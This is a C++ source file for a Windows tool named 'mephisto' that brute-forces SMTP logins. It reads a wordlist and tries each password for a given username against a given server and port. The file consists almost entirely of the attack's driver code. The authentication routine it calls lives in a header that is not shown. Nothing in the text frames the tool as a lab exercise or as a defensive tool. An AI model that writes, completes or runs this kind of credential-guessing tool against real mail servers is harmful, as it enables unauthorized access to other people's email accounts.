#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <Winsock2.h>
#include <windows.h>
#include "mephisto.h" // Include header file

#pragma comment(lib, "ws2_32.lib")

// Main function to iterate through wordlist
int main(int argc, char *argv[]) {
    // Make sure the correct number of arguments are provided
    if (argc != 7) {
        std::cerr << "Usage: mephisto.exe -l <username> -P <path_to_wordlist> <server> <port>" << std::endl;
        return 1;
    }

    // Parse command-line arguments
    std::string username, wordlistPath, server;
    int port = 0;

    // Parse arguments
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-l" && i + 1 < argc) {
            username = argv[i + 1];
            i++; // Skip next argument as it's already processed
        } else if (arg == "-P" && i + 1 < argc) {
            wordlistPath = argv[i + 1];
            i++; // Skip next argument as it's already processed
        } else if (arg == "-h") {
            std::cout << "Usage: mephisto.exe -l <username> -P <path_to_wordlist> <server> <port>" << std::endl;
            return 0;
        } else if (server.empty()) {
            server = arg;
        } else if (port == 0) {
            port = std::stoi(arg);
        } else {
            std::cerr << "Invalid argument: " << arg << std::endl;
            return 1;
        }
    }

    // Check if the required arguments were provided
    if (username.empty() || wordlistPath.empty() || server.empty() || port == 0) {
        std::cerr << "Error: Missing required arguments." << std::endl;
        return 1;
    }

    // Open the wordlist file
    std::ifstream wordlist(wordlistPath);
    if (!wordlist) {
        std::cerr << "Error opening wordlist file." << std::endl;
        return 1;
    }

    std::string password;
    while (std::getline(wordlist, password)) {
        if (smtpConnectAndAuthenticate(server, port, username, password)) {
            return 0;  // Password found
        }
    }

    std::cout << "KEY NOT FOUND" << std::endl;
    return 0;
}
